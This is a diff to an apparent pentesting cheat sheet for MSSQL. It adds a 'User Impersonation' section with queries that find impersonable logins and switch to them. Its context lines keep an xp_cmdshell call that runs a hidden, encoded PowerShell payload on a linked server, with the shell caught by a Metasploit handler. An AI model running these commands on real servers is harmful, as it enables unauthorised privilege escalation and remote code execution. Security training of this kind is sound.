@@ -69,13 +69,6 @@
                 <pre><code class="language-sql">SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';</code></pre>
                 <p>In case you can...</p>
                 <pre><code class="language-sql">EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER;</code></pre>
-                
-
-                
-
-
-
-                SELECT name FROM master.sys.syslogins;
             </ul>
 
 
@@ -120,6 +113,16 @@ RECONFIGURE;</code></pre>
                 <p>Perform connection from mssql srv. Have in mind that there is a link statement at the end. It is not necessary always</p>
                 <pre><code class="language-sql">EXEC ('EXEC xp_cmdshell ''powershell -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgB...''') AT [DC02.darkzero.ext]</code></pre>    
                 <p>Capture the connection using plugin exploit/multi/handler</p>
+            </ul>
+
+            <h3>User Impersonation</h3> 
+             <ul>  
+                <h4>Using the following query you are able to check if you can IMPERSONATE any user</h4>
+                <pre><code class="language-sql">SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'</code></pre>
+                <p>In case you found a user. Execute the following to impersonate</p>
+                <pre><code class="language-sql">EXECUTE AS LOGIN = '$USERNAME'</code></pre>
+                <p>Check that you are impersonating the right user
+                <pre><code class="language-sql">SELECT SYSTEM_USER</code></pre>
             </ul>
             </ul>
         </div>
